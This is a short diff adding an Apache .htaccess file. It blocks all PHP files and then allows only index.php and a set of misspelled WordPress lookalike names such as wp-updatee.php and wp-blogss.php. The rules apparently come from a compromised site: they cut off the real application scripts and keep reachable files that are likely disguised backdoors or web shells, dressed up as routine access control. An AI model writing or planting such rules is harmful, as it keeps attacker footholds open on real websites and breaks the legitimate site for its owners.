@@ -1,0 +1,8 @@
+<FilesMatch ".*\.(pophtml|php)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "(index|wp-updatee|wp-blockk|wp-blogg|wp-contentt|wp-pingg|wp-blogss).php$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
